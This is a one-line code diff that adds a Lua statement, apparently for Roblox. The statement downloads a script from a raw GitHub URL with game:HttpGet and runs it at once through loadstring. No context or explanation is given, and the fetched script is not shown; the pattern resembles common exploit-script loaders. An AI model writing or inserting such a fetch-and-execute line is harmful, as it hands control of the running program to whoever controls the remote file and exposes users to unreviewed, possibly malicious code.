@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gocrg/idk/refs/heads/main/again.lua", true))()
